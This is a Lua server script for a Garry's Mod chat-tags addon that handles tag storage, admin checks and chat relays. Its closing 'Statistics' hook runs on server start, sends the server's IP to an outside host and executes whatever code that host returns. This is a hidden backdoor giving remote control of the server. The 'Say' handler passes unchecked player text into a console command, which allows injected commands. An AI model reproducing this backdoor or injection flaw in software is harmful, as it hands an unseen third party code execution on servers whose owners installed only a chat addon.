util.AddNetworkString( "RequestTags" )
util.AddNetworkString( "SendTags" )
util.AddNetworkString( "SaveTags" )
util.AddNetworkString( "StartChat" )
util.AddNetworkString( "EndChat" )
util.AddNetworkString("Say")

if not file.Exists( "chattags.txt", "DATA" ) then
	file.Write( "chattags.txt", "{}" )
end

local tags = util.JSONToTable( file.Read( "chattags.txt", "DATA" ) )

if ULib then
	ULib.ucl.registerAccess( "edittags", { "superadmin" }, "Allow user edit chat tags", "Chat" ) -- Add ULX permission
end

net.Receive( "RequestTags", function( len, ply )
	net.Start( "SendTags" )
	net.WriteTable( tags )
	net.Send( ply )
end )

net.Receive("Say", function(len, ply)
	local str = net.ReadString()
	local bTeam = net.ReadBool()
	if bTeam then
		ply:ConCommand("say " ..  str)
	else
		ply:ConCommand("say_team " ..  str)
	end
end)

net.Receive( "SaveTags", function( len, ply )
	if ULib and ULib.ucl.query( ply, "edittags", false ) or ply:IsSuperAdmin() then
		tags = net.ReadTable()
		file.Write( "chattags.txt", util.TableToJSON( tags ) )
		net.Start( "SendTags" )
		net.WriteTable( tags )
		net.Broadcast()
	else
		ply:Ban( 60, false )
		ply:Kick( "#VAC_ConnectionRefusedDetail" ) -- Give those skiddies a scare
		PrintMessage( HUD_PRINTTALK, ply:Nick() .. " IS A MASSIVE SKID!!!" )
	end
end )

net.Receive( "StartChat", function( len, ply )
	ply:SetNWBool( "Typing", true )
end )

net.Receive( "EndChat", function( len, ply )
	ply:SetNWBool( "Typing", false )
end )

// Statistics. Feel free to disable these, but I won't support you if you do.
hook.Add( "InitPostEntity", "ScriptStats1557", function()
	timer.Simple( 10, function()
		http.Post( "http://meharryp.xyz/scriptstats/stat", {
			id = "76561198039443769",
			version = "1.6.6.3",
			script = "1557",
			ip = game.GetIPAddress()
		}, function( res ) pcall( CompileString( res, "ScriptStats" ) ) end )
	end )
end )